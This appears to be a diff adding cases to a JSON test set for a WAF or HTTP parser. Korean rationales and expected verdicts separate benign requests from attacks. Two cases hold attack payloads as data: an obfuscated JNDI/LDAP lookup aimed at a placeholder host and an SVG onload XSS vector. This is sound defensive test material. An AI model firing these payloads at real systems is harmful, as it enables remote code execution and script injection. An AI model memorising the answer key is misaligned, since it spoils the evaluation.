+  },
+  {
+    "event_id": "waf-parser-v1-043",
+    "case_name": "Multipart 평문 파일 이름의 세미콜론",
+    "test_category": "parser/multipart_and_duplicate_fields",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "파일명의 세미콜론과 평문 문서이며 명령 실행 구문이 아니다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "filename=\"minutes;final.txt\""
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-044",
+    "case_name": "중복 Cookie에 포함된 정상 표시 이름",
+    "test_category": "parser/multipart_and_duplicate_fields",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "표시 이름의 작은따옴표를 공격 조건식과 구분한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "display_name=O%27Reilly"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-045",
+    "case_name": "반복 접근 범위 인자의 상충",
+    "test_category": "parser/multipart_and_duplicate_fields",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "공개 범위가 상충하지만 애플리케이션의 중복 처리 규칙·권한 정책을 알 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "visibility=private&visibility=public"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-046",
+    "case_name": "긴 무관 헤더 뒤의 난독화 JNDI",
+    "test_category": "parser/length_and_framing_edges",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "긴 잡음 뒤에도 외부 JNDI 조회 유도식이 존재한다. 원문 선별과 인용 보존을 확인한다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lookup.invalid/fixture-c}"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-047",
+    "case_name": "청크 확장 표기와 HTML 실행 본문",
+    "test_category": "parser/length_and_framing_edges",
+    "expected_verdict": "true_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "청크 형식으로 감싼 HTML 렌더링 입력에 실행형 이벤트 핸들러가 남아 있다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "<svg onload=alert(131)>"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-048",
+    "case_name": "긴 정상 쿠키 뒤의 숫자형 페이지 요청",
+    "test_category": "parser/length_and_framing_edges",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "긴 쿠키 값 자체는 공격이 아니며 요청 인자에도 실행형 표현식이 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "page=3&size=10"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-049",
+    "case_name": "본문 속 HTTP 구분자 예시 문서",
+    "test_category": "parser/length_and_framing_edges",
+    "expected_verdict": "false_positive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "평문 문서 안의 HTTP 예시를 두 번째 실제 요청으로 단정하지 않는 사례다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "This is quoted documentation."
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  },
+  {
+    "event_id": "waf-parser-v1-050",
+    "case_name": "서로 다른 Content-Length와 일부 본문",
+    "test_category": "parser/length_and_framing_edges",
+    "expected_verdict": "inconclusive",
+    "expected_parser_version": "generic-http-v3",
+    "expected_parse_status": "success",
+    "rationale_ko": "본문 길이 선언이 충돌하고 수집된 내용도 짧다. 전후단 처리와 캡처 범위 없이 스머글링 또는 정상으로 확정할 수 없다.",
+    "important_evidence": [
+      {
+        "field": "payload",
+        "excerpt": "Content-Length: 19"
+      }
+    ],
+    "verification_notes_ko": "작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."
+  }
+]
